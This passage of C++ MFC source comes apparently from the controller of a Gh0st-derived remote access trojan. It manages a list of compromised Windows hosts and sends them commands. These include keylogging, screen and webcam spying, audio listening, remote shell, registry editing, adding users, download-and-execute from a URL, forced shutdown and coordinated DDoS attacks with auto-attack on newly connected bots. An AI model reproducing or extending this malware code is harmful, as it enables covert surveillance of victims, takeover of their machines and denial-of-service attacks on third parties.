					g_pLogView->InsertLogItem( strLogText, 0, 1 );
					
					strLogText = pView->m_pListCtrl->GetItemText( i, 4 );
					strLogText.MakeUpper();
					if ( strLogText.Find("NT") != -1 )
					{
						g_pNumDlg->NT--;
						g_pNumDlg->SetNum( IDC_WIN_NT, g_pNumDlg->NT );
					}
					if ( strLogText.Find("XP") != -1 )
					{
						g_pNumDlg->XP--;
						g_pNumDlg->SetNum( IDC_WIN_XP, g_pNumDlg->XP );
					}
					if ( strLogText.Find("Vista") != -1 )
					{
						g_pNumDlg->Vista--;
						g_pNumDlg->SetNum( IDC_WIN_VISTA, g_pNumDlg->Vista );
					}
					if ( strLogText.Find("Win7") != -1 )
					{
						g_pNumDlg->Win7--;
						g_pNumDlg->SetNum( IDC_WIN_7, g_pNumDlg->Win7 );
					}
					if ( strLogText.Find("2000") != -1 )
					{
						g_pNumDlg->Win2000--;
						g_pNumDlg->SetNum( IDC_WIN_2000, g_pNumDlg->Win2000 );
					}
					if ( strLogText.Find("2003") != -1 )
					{
						g_pNumDlg->Win2003--;
						g_pNumDlg->SetNum( IDC_WIN_2003, g_pNumDlg->Win2003 );
					}
					if ( strLogText.Find("2008") != -1 )
					{
						g_pNumDlg->Win2008--;
						g_pNumDlg->SetNum( IDC_WIN_2008, g_pNumDlg->Win2008 );
					}
					pView->m_pListCtrl->DeleteItem(i);

					g_pFrame->OnTimerschushi(); //ˢ��������ֵ��ʾ

					/************************************/
                    //������ʾ
				    BOOL b_chk   = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("����", "Alarm", false);
				    if (b_chk != false)
					{
					    PlaySound(MAKEINTRESOURCE(IDR_WAVE1),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
					}

					/************************************/

					break;
				}		
			}
			
			// �ر���ش���
			switch (pContext->m_Dialog[0])
			{
			case FILEMANAGER_DLG:
			case SCREENSPY_DLG:
			case WEBCAM_DLG:
			case AUDIO_DLG:
			case KEYBOARD_DLG:
			case SYSTEM_DLG:
			case SHELL_DLG:
			case REGEDIT_DLG:
			case SERMANAGER_DLG:
            case USER_DLG:
				//((CDialog*)pContext->m_Dialog[1])->SendMessage(WM_CLOSE);
				((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
				break;
				break;
			default:
				break;
				break;
			}
		}catch(...){}
	}
	
	// ���µ�ǰ��������
	g_pTabView->UpDateNumber();
	g_pFrame->ShowConnectionsNumber();

	Invalidate();		//ˢ��

	return 0;
}

void CPcView::SendALLSelectCommand(PBYTE pData, UINT nSize)
{
	if ( g_pConnectView == NULL ) //û������
    {
//				AfxMessageBox("��δ��ʼ��,��ȴ���������.");
            return;
    }

	CPcView* pView = NULL;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();



	int p = 0;
	for (int n = 0; n < nTabs; n++ )
	{

		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->TCItem_GetHandle(n)));
		int nCnt = pView->m_pListCtrl->GetItemCount();

		POSITION pos = pView->m_pListCtrl->GetFirstSelectedItemPosition();
		while(pos)
		{
			int nItem = pView->m_pListCtrl->GetNextSelectedItem(pos);
			pView->m_pListCtrl->SetCheck(nItem,TRUE);                
		}
			
		for(int x = 0; x < nCnt; x++)
		{
			if (pView->m_pListCtrl->GetCheck(x) == TRUE)
				p = p + 1;			
		}		

		if (p == 0)
			return;
		for(int i = 0; i < nCnt; i++)//����ѭ��
		{
			if (pView->m_pListCtrl->GetCheck(i) == TRUE)//��ѡ��ѡ������
			{                
				ClientContext* pContext = (ClientContext*)pView->m_pListCtrl->GetItemData(i);
				m_iocpServer->Send(pContext, pData, nSize);
			}
		}
	}
}

void CPcView::SendSelectCommand(PBYTE pData, UINT nSize)
{

    POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();

	while(pos)
	{
		int nItem =m_pListCtrl->GetNextSelectedItem(pos);
		m_pListCtrl->SetCheck(nItem,TRUE);                
	}
 	CPcView* pView = NULL;		
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->TCItemSel_GetHandle()));
		
	int nItems = pView->m_pListCtrl->GetItemCount();       
	int p = 0;
	for(int x = 0; x < nItems; x++)
	{
		if (pView->m_pListCtrl->GetCheck(x) == TRUE)
			p = p + 1;	
	}
	if (p == 0)
		return;
    for(int i = 0; i < nItems; i++)//����ѭ��
    {
        if (pView->m_pListCtrl->GetCheck(i) == TRUE)//��ѡ��ѡ������
        {             
			OutputDebugString("send����");   
            ClientContext* pContext = (ClientContext*)pView->m_pListCtrl->GetItemData(i);
            m_iocpServer->Send(pContext, pData, nSize);
        }
    }     
/*
	if ( g_pConnectView == NULL ) //û������
	{
		AfxMessageBox("��ѡ��������");
		return;
	}
	
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	while(pos)
	{
		int nItem = m_pListCtrl->GetNextSelectedItem(pos);
		ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(nItem);
		m_iocpServer->Send(pContext, pData, nSize);                
	}
*/	
}

void CPcView::SortColumn(int iCol, bool bAsc)
{
	m_bAscending = bAsc;
	m_nSortedCol = iCol;
	
	// set sort image for header and sort column.
	//	m_listCtrl.SetSortImage(m_nSortedCol, m_bAscending);
	//CXTSortClass csc(m_pListCtrl, m_nSortedCol);
	//csc.Sort(m_bAscending, xtSortString);

}

BOOL CPcView::OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult) 
{
	// TODO: Add your specialized code here and/or call the base class
	HD_NOTIFY *pHDNotify = (HD_NOTIFY*)lParam;
	if (pHDNotify->hdr.code == HDN_ITEMCLICKA || pHDNotify->hdr.code == HDN_ITEMCLICKW)
	{
		SortColumn(pHDNotify->iItem, !m_bAscending);
	}
	return CListView::OnNotify(wParam, lParam, pResult);
}

void CPcView::OnDisconnect() 
{
	// TODO: Add your command handler code here
	CString strLogText;
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	if ( pos == NULL )
	{
		return;
	}
	if (MessageBox("ȷ�϶Ͽ������� -:)", "Warning", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	while (pos) 
	{	
		int n = m_pListCtrl->GetNextSelectedItem(pos);
		
		strLogText.Format( "�����Ͽ�: [%s - %s]", m_pListCtrl->GetItemText( n, 0 ), m_pListCtrl->GetItemText(n, 1) );
		
		g_pLogView->InsertLogItem( strLogText, 0, 1 );
		
		strLogText = m_pListCtrl->GetItemText( n, 3 );
		strLogText.MakeUpper();
		if ( strLogText.Find("NT") != -1 )
		{
			g_pNumDlg->NT--;
			g_pNumDlg->SetNum( IDC_WIN_NT, g_pNumDlg->NT );
		}
		if ( strLogText.Find("XP") != -1 )
		{
			g_pNumDlg->XP--;
			g_pNumDlg->SetNum( IDC_WIN_XP, g_pNumDlg->XP );
		}
		if ( strLogText.Find("Vista") != -1 )
		{
			g_pNumDlg->Vista--;
			g_pNumDlg->SetNum( IDC_WIN_VISTA, g_pNumDlg->Vista );
		}
		if ( strLogText.Find("Win7") != -1 )
		{
			g_pNumDlg->Win7--;
			g_pNumDlg->SetNum( IDC_WIN_7, g_pNumDlg->Win7 );
		}
		if ( strLogText.Find("2000") != -1 )
		{
			g_pNumDlg->Win2000--;
			g_pNumDlg->SetNum( IDC_WIN_2000, g_pNumDlg->Win2000 );
		}
		if ( strLogText.Find("2003") != -1 )
		{
			g_pNumDlg->Win2003--;
			g_pNumDlg->SetNum( IDC_WIN_2003, g_pNumDlg->Win2003 );
		}
		if ( strLogText.Find("2008") != -1 )
		{
			g_pNumDlg->Win2008--;
			g_pNumDlg->SetNum( IDC_WIN_2008, g_pNumDlg->Win2008 );
		}
		
		m_pListCtrl->DeleteItem(n);	
	}
	
	g_pTabView->UpDateNumber();
	g_pFrame->ShowConnectionsNumber();

	Invalidate();		//ˢ��
}

void CPcView::OnFilemanager() 
{
	// TODO: Add your command handler code here

	BYTE	bToken = COMMAND_LIST_DRIVE;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPcView::OnScreenspy() 
{
	// TODO: Add your command handler code here

	BYTE	bToken = COMMAND_SCREEN_SPY;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPcView::OnKeyboard() 
{
	// TODO: Add your command handler code here

	BYTE	bToken = COMMAND_KEYBOARD;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPcView::OnRemoteshell() 
{
	// TODO: Add your command handler code here

	BYTE	bToken = COMMAND_SHELL;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPcView::OnSystem() 
{
	// TODO: Add your command handler code here

	BYTE	bToken = COMMAND_SYSTEM;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPcView::OnSermanager() 
{
	// TODO: Add your command handler code here

	OutputDebugString("������");
	BYTE	bToken = COMMAND_SERMANAGER;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CPcView::OnWebcam() 
{
	// TODO: Add your command handler code here

	BYTE	bToken = COMMAND_WEBCAM;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPcView::OnAudioListen() 
{
	// TODO: Add your command handler code here

	BYTE	bToken = COMMAND_AUDIO;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CPcView::OnRegedit()   //ע���
{
	// TODO: Add your command handler code here

	BYTE	bToken = COMMAND_REGEDIT;
	SendSelectCommand(&bToken,sizeof(BYTE));
}

void CPcView::OnRenameRemark() 
{
	// TODO: Add your command handler code here
	CString strTitle;

	if (m_pListCtrl->GetSelectedCount() == 1)
		strTitle.Format("��������(%s)�ı�ע", m_pListCtrl->GetItemText(m_pListCtrl->GetSelectionMark(), 0));
	else
		strTitle = "��������������ע";
	CInputDialog	dlg;
	dlg.Init(strTitle, _T("�������µı�ע:"), this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)   
		return;
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_RENAME_REMARK;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		m_pListCtrl->SetItemText(nItem, 3, dlg.m_str);
	}
	
	delete[] lpPacket;
}

void CPcView::OnShowmsg() 
{
	// TODO: Add your command handler code here

	CMsgBox dlg;
	dlg.DoModal();
}

void CPcView::OnRemove() 
{
	// TODO: Add your command handler code here

	if (MessageBox("ȷ��ж�ط������??", "����!", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_REMOVE;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPcView::OnLogoff() 
{
	// TODO: Add your command handler code here

	if (MessageBox("ȷ��ע���������??", "����!", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_LOGOFF | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));
}

void CPcView::OnReboot() 
{
	// TODO: Add your command handler code here

	if (MessageBox("ȷ�������������??", "����!", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
}

void CPcView::OnShutdown() 
{
	// TODO: Add your command handler code here

	if (MessageBox("ȷ�Ϲرշ������??", "����!", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
}

void CPcView::OnDownexec() 
{
	// TODO: Add your command handler code here

	CInputDialog	dlg;
	dlg.Init(_T("������"), _T("������Ҫ�����ļ��ĵ�ַ:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("�������ַ���Ϸ�", "����");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_DOWN_EXEC;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CPcView::OnUpdateServer() 
{
	// TODO: Add your command handler code here

	CInputDialog	dlg;
	dlg.Init(_T("���ظ��·����"), _T("������Ҫ�����·���˵ĵ�ַ:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("�������ַ���Ϸ�", "����");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_UPDATE_SERVER;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CPcView::OnOpenUrlHide() 
{
	// TODO: Add your command handler code here

	CInputDialog	dlg;
	dlg.Init(_T("Զ�̷�����ַ"), _T("������Ҫ���ط��ʵ���ַ:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("�������ַ���Ϸ�", "����");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_HIDE;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CPcView::OnOpenUrlShow() 
{
	// TODO: Add your command handler code here

	CInputDialog	dlg;
	dlg.Init(_T("Զ�̷�����ַ"), _T("������Ҫ��ʾ���ʵ���ַ:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("�������ַ���Ϸ�", "����");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_SHOW;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CPcView::OnSelectAll() //ѡ��ȫ��
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		m_pListCtrl->SetItemState(i, LVIS_SELECTED, LVIS_SELECTED);//�����б�����˾��ÿ���������ѡ��
		m_pListCtrl->SetCheck( i, TRUE);  
	}
}

void CPcView::OnUnselectAll() //ȡ��ѡ��
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		m_pListCtrl->SetItemState(i, 0, LVIS_SELECTED);//����ͬ��
		m_pListCtrl->SetCheck( i, FALSE);  
	}
}

void CPcView::OnChangeGroup() 
{
	// TODO: Add your command handler code here

	CChangeGroup m_group;
	if ( m_group.DoModal() == IDOK )
	{	
		
		int	nPacketLength = m_group.strGroup.GetLength() + 2;
		LPBYTE	lpPacket = new BYTE[nPacketLength];
		lpPacket[0] = COMMAND_CHANGE_GROUP;
		memcpy(lpPacket + 1, m_group.strGroup.GetBuffer(0), nPacketLength - 1);
		SendSelectCommand(lpPacket, nPacketLength);
		
		CString strTemp, strGroupName;
		CPcView* pView = NULL;
		int count = g_pTabView->m_wndTabControl.GetItemCount();
		for ( int i = 0; i < count; i++ )
		{
			strTemp = g_pTabView->TCItem_GetText(i);
			int n = strTemp.ReverseFind('(');
			if ( n > 0)
			{
				strGroupName = strTemp.Left(n);
			}
			else
			{
				strGroupName = strTemp;
			}
			if ( strGroupName == m_group.strGroup )
			{
				pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->TCItem_GetHandle(i)));
				break;
			}
		}
		if ( pView == NULL )
		{
			strTemp.Format( "%s(0)", m_group.strGroup );
			g_pTabView->AddGroup( strTemp );
			pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->TCItem_GetHandle(count)));
			pView->NewInitialUpdate();
			pView->m_iocpServer = m_iocpServer;
		}
		
		POSITION pos;
		for(; pos = m_pListCtrl->GetFirstSelectedItemPosition();)
		{
			int m = m_pListCtrl->GetNextSelectedItem(pos);
			
			ClientContext	*pContext = (ClientContext *)(m_pListCtrl->GetItemData(m));
			
			int nCnt = pView->m_pListCtrl->GetItemCount();
			int i = 0;
			
			// i = pView->m_pListCtrl->InsertItem(nCnt, "", 0);
		
			///////////////////////////////�޸�BUG/////////////////////////////////////////////

			LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
			CString stryu;
		
			if (LoginInfo->bIsWebCam)
			{
				i = pView->m_pListCtrl->InsertItem(nCnt, stryu , 0);
			}
			else
			{
				i = pView->m_pListCtrl->InsertItem(nCnt, stryu, 1);
			}
			
			/////////////////////////////////////////////////////////////////////////////////
			//��������
			pView->m_pListCtrl->SetItemText(i, 0, m_pListCtrl->GetItemText(m, 0));
			
			// ����IP
			pView->m_pListCtrl->SetItemText(i, 1, m_pListCtrl->GetItemText(m, 1));
			
			// ����IP
			pView->m_pListCtrl->SetItemText(i, 2, m_pListCtrl->GetItemText(m, 2));
			
			// ������
			pView->m_pListCtrl->SetItemText(i, 3, m_pListCtrl->GetItemText(m, 3));
			
			// ϵͳ
			pView->m_pListCtrl->SetItemText(i, 4, m_pListCtrl->GetItemText(m, 4));
			
			// CPU
			pView->m_pListCtrl->SetItemText(i, 5, m_pListCtrl->GetItemText(m, 5));
			
			// Ӳ�̴�С���ڴ��С
			pView->m_pListCtrl->SetItemText(i, 6, m_pListCtrl->GetItemText(m, 6));

			// ��Ƶ״��
			pView->m_pListCtrl->SetItemText(i, 7, m_pListCtrl->GetItemText(m, 7));

			// ����汾
			pView->m_pListCtrl->SetItemText(i, 8, m_pListCtrl->GetItemText(m, 8));

			// ����װʱ��
			pView->m_pListCtrl->SetItemText(i, 9, m_pListCtrl->GetItemText(m,9));

			// ��������
			pView->m_pListCtrl->SetItemText(i, 10, m_pListCtrl->GetItemText(m, 10));
	
			// Speed
			pView->m_pListCtrl->SetItemText(i, 11, m_pListCtrl->GetItemText(m, 11));
			
			// ����λ��
			pView->m_pListCtrl->SetItemText(i, 12, m_pListCtrl->GetItemText(m, 12));


			
			// ָ��Ψһ��ʶ
			pView->m_pListCtrl->SetItemData(i, (DWORD) pContext);
			
			m_pListCtrl->DeleteItem(m);
			
			g_pTabView->UpDateNumber();
			g_pFrame->ShowConnectionsNumber();
		}
	}

	Invalidate();		//ˢ��

	// ���µ�ǰ��������
//	g_pTabView->UpDateNumber();
//	g_pFrame->ShowConnectionsNumber();
}

LRESULT CPcView::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext *pContext = (ClientContext *)lParam;

	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_FILE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;

	return 0;
}

LRESULT CPcView::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext *pContext = (ClientContext *)lParam;

	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext *pContext = (ClientContext *)lParam;
	CWebCamDlg	*dlg = new CWebCamDlg(this, m_iocpServer, pContext);
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_WEBCAM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = WEBCAM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext *pContext = (ClientContext *)lParam;
	CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenKeyBoardDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext	*pContext = (ClientContext *)lParam;
	CKeyBoardDlg	*dlg = new CKeyBoardDlg(this, m_iocpServer, pContext);

	// ���ø�����Ϊ׿��
	dlg->Create(IDD_KEYBOARD, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = KEYBOARD_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext	*pContext = (ClientContext *)lParam;
	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);
	
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_SYSTEM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SYSTEM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext	*pContext = (ClientContext *)lParam;
	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);
	
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenSerManagerDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext	*pContext = (ClientContext *)lParam;
	CSerManager	*dlg = new CSerManager(this, m_iocpServer, pContext);
	
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_SERMANA, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SERMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

//DOSS
VOID CPcView::GetHostNums(DWORD &OnlineHost,DWORD &SelectedHost)
{
	OnlineHost = m_pListCtrl->GetItemCount();
	
	SelectedHost = 0;
	
	for (DWORD i=0;i<OnlineHost;i++)
		if(m_pListCtrl->GetCheck(i))
			SelectedHost++;
}

WORD CPcView::SendDDostStopCommand(WORD iTaskID)
{
	DWORD iCount = m_pListCtrl->GetItemCount();
	WORD Count =0;
	CHAR szStatus[500]={NULL};
	
	CHAR szTask[20]={NULL};
	wsprintf(szTask,"���� %d",iTaskID);
	
	BYTE pData[2]={COMMAND_DDOS_STOP,0};
	
	//ֹͣ���Զ�
	if(iTaskID == m_AutoTask)
		m_AutoAttack = FALSE;

	for (DWORD i=0;i<iCount;i++) 
	{
		//��������Ƿ����״̬
		m_pListCtrl->GetItemText(i,9,szStatus,500);
		if(strcmp(szStatus,szTask)==0)
		{
			ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(i);
			// ����DDOS ��������
			m_iocpServer->Send(pContext, &pData[0], 2);
			Count++;
			m_pListCtrl->SetItemText(i,9,"����");
		}
	}

	Invalidate();		//ˢ��

	return Count;
}

VOID CPcView::SendAutoAttack(ClientContext *Context)
{
	if(m_AutoAttack == FALSE)
		return;

	WORD nSize = sizeof(ATTACK);
	
	LPBYTE pData = new BYTE[nSize+1];
	

	pData[0]=COMMAND_DDOS_ATTACK;//������Ϣ..
	ATTACK m_Send;
	memcpy(&m_Send,&m_AutoAttackData,nSize);
	
	memcpy(pData+1,&m_Send,nSize);	
	
	m_iocpServer->Send(Context, pData, nSize+1);
	
	DWORD iCount = m_pListCtrl->GetItemCount();
	char StrShow[20]={NULL};
	wsprintf(StrShow,"���� %d",m_AutoTask);

	m_pListCtrl->SetItemText(iCount-1,9,StrShow);

	Invalidate();		//ˢ��

	delete pData;
}

WORD CPcView::SendDDosAttackCommand(LPATTACK m_Attack,INT HostNums,BOOL AutoAttack,WORD iTaskID)
{	
	DWORD iCount = m_pListCtrl->GetItemCount();
	
	WORD nSize = sizeof(ATTACK);

	LPBYTE pData = new BYTE[nSize+1];
	
	pData[0]=COMMAND_DDOS_ATTACK;//������Ϣ..
	ATTACK m_Send;
	memcpy(&m_Send,m_Attack,nSize);

	memcpy(pData+1,&m_Send,nSize);
	

	WORD Count = 0;
	CHAR szStatus[500]={NULL};
	CHAR szTask[20]={NULL};
	wsprintf(szTask,"���� %d",iTaskID);

	//˵����ѡ������
	if(HostNums==-1)
	{
		for (DWORD i=0;i<iCount;i++) 
		{
			if(m_pListCtrl->GetCheck(i))
			{
				//��������Ƿ����״̬
				m_pListCtrl->GetItemText(i,9,szStatus,500);
				if(strcmp(szStatus,"����")==0)
				{
					ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(i);
					// ����DDOS ��������
					m_iocpServer->Send(pContext, pData, nSize+1);
					Count++;
					m_pListCtrl->SetItemText(i,9,szTask);
				}
			}
		}
	}
	else
	{
		if(iCount<HostNums)
			HostNums = iCount;
		
		for (DWORD i=0;i<HostNums;i++)
		{
			//��������Ƿ����״̬
			m_pListCtrl->GetItemText(i,9,szStatus,500);
			if(strcmp(szStatus,"����")==0)
			{
				ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(i);
				// ����DDOS ��������
				m_iocpServer->Send(pContext, pData, nSize+1);
				Count++;
				m_pListCtrl->SetItemText(i,9,szTask);
			}
		}
	}
	delete []pData;

	if(AutoAttack)
	{
		m_AutoAttack = TRUE;
		m_AutoTask = iTaskID;
		memcpy(&m_AutoAttackData,m_Attack,sizeof(ATTACK));
	}

	Invalidate();		//ˢ��

	return Count;
}
//DOSS

LRESULT CPcView::OnOpenRegeditDialog(WPARAM wParam, LPARAM lParam)    //ע���
{

    ClientContext	*pContext = (ClientContext *)lParam;
	CRegDlg	*dlg = new CRegDlg(this, m_iocpServer, pContext);
	//���ø�����Ϊ׿��
    dlg->Create(IDD_REG_DIALOG, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = REGEDIT_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenUserDialog(WPARAM wParam, LPARAM lParam)  //����������
{

	ClientContext	*pContext = (ClientContext *)lParam;
	CUser	*dlg = new CUser(this, m_iocpServer, pContext);
	
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_ADD_USER, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = USER_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

////////////////////////////////////////������
void CPcView::OnIplist() 
{
	// TODO: Add your command handler code here
	   CFileDialog dlg(FALSE, _T("txt"), _T("iplist.txt"), OFN_OVERWRITEPROMPT, _T("�ı��ļ�|*.txt"), NULL);
	   if (dlg.DoModal() != IDOK)
		   return;
	   CFile file;
	   char ip[50] = {0};
	   if (file.Open(dlg.GetPathName(), CFile::modeCreate | CFile::modeWrite))
	   {
		   POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
		   while (pos)
		   {
			   int nItem = m_pListCtrl->GetNextSelectedItem(pos);
			   CString strTitle;
			   strTitle.Format(_T("%s%s"), m_pListCtrl->GetItemText(nItem, 0), _T("\r\n"));
			   file.Write(strTitle, strlen(strTitle));
		   }
		   file.Close();
		   AfxMessageBox(_T("IP�б����ɹ�!"));
	   }
}

void SetClipboardText(CString &Data)
{
	if(OpenClipboard(NULL) == 0)
		return;
	EmptyClipboard();
	HGLOBAL htext = GlobalAlloc(GHND, Data.GetLength() + 1);
	if(htext != 0)
	{
		MoveMemory(GlobalLock(htext), Data.GetBuffer(0), Data.GetLength());
		GlobalUnlock(htext);
		SetClipboardData(1, (HANDLE)htext);
		GlobalFree(htext);
	}
	CloseClipboard();
}

void CPcView::OnIp() 
{

	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		Name = m_pListCtrl->GetItemText(nItem, 1);
		Data += Name;
		Data += "\r\n";
	}
	Data = Data.Left(Data.GetLength() - 2);
	SetClipboardText(Data);
}

void CPcView::OnBeizhu() 
{

	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		Name = m_pListCtrl->GetItemText(nItem, 3);
		Data += Name;
		Data += "\r\n";
	}
	Data = Data.Left(Data.GetLength() - 2);
	SetClipboardText(Data);	
}

void CPcView::OnDilixinxi() 
{

	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	while(pos)
	{
